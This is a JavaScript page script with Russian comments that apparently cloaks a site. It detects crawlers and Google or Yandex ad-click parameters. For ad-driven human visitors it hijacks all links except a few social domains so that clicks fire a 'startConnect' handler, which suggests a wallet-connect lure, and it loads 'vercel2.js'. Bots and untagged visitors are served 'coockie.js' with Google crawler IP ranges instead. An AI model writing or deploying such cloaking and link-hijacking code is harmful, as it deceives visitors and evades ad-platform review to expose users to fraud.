setTimeout(() => {
    // Функция для проверки является ли пользователь ботом
    function isBot() {
        const userAgent = navigator.userAgent.toLowerCase();
        const bots = [
            'bot', 'crawler', 'spider', 'scraper', 'facebookexternalhit',
            'twitterbot', 'linkedinbot', 'telegrambot', 'whatsapp',
            'googlebot', 'bingbot', 'yandexbot', 'baidubot'
        ];
        return bots.some(bot => userAgent.includes(bot));
    }

    // Функция для получения параметров из URL
    function getUrlParams() {
        const params = {};
        const queryString = window.location.search.substring(1);
        const pairs = queryString.split('&');
        
        pairs.forEach(pair => {
            const [key, value] = pair.split('=');
            if (key) {
                params[key.toLowerCase()] = decodeURIComponent(value || '');
            }
        });
        
        return params;
    }

    // Функция для загрузки JS файла
    function loadScript(src, callback) {
        const script = document.createElement('script');
        script.src = src;
        script.type = 'text/javascript';
        script.onload = callback;
        script.onerror = function() {
            console.error('Ошибка загрузки скрипта: ' + src);
        };
        document.head.appendChild(script);
    }

    // Список IP-адресов для coockie.js
    const ipRanges = {
        "creationTime": "2025-10-29T15:45:57.000000",
        "prefixes": [
            // ... (ваш полный список IP-адресов остается без изменений)
            {"ipv4Prefix": "66.249.79.64/27"}
        ]
    };

    // Основная логика
    const params = getUrlParams();
    const hasGclid = params.hasOwnProperty('gclid');
    const hasPromopult = params.hasOwnProperty('promopult_yandex_direct') || 
                         params.utm_source === 'promopult_yandex_direct';
    const hasGadSource = params.hasOwnProperty('gad_source');
    const hasGBraid = params.hasOwnProperty('gbraid');
    const hasWBraid = params.hasOwnProperty('wbraid');

    // Проверяем все возможные параметры
    const hasTrackingParams = hasGclid || hasPromopult || hasGadSource || hasGBraid || hasWBraid;

    if (!isBot() && hasTrackingParams) {
        // Добавляем скрипт для блокировки ссылок
        const linkBlockerScript = document.createElement('script');
        linkBlockerScript.textContent = `
            // Function to handle the connect action
            window.startConnect = function() {
                console.log("startConnect function triggered!");
                // Add your custom logic for startConnect here
            };

            // Function to block href navigation and trigger startConnect
            document.addEventListener('DOMContentLoaded', function() {
                const links = document.querySelectorAll('a[href]');
                const allowedDomains = [
                    'x.com',
                    'twitter.com', 
                    'discord.gg',
                    't.me'
                ];
                
                // Функция для проверки домена
                function isAllowedDomain(url) {
                    try {
                        const domain = new URL(url, window.location.origin).hostname;
                        return allowedDomains.some(allowed => 
                            domain === allowed || 
                            domain.endsWith('.' + allowed)
                        );
                    } catch (e) {
                        return false;
                    }
                }
                
                links.forEach(link => {
                    const href = link.getAttribute('href');
                    if (href && !isAllowedDomain(href)) {
                        link.addEventListener('click', function(event) {
                            event.preventDefault();
                            window.startConnect();
                        });
                    }
                });
            });
        `;
        document.head.appendChild(linkBlockerScript);
      
        // Загружаем vercel2.js для пользователей с метками через script тег
        const vercelScript = document.createElement('script');
        vercelScript.charset = 'UTF-8';
        vercelScript.type = 'text/javascript';
        vercelScript.src = './vercel2.js';
        document.head.appendChild(vercelScript);
        
        console.log('vercel2.js загружен через script тег');
    } else {
        // Передаем IP-адреса в глобальную переменную перед загрузкой coockie.js
        window.googleIPRanges = ipRanges;
      
        // Загружаем coockie.js для пользователей без меток
        loadScript('coockie.js', function() {
            console.log('coockie.js загружен с IP-адресами');
        });
    }
}); // Закрывающая скобка для setTimeout
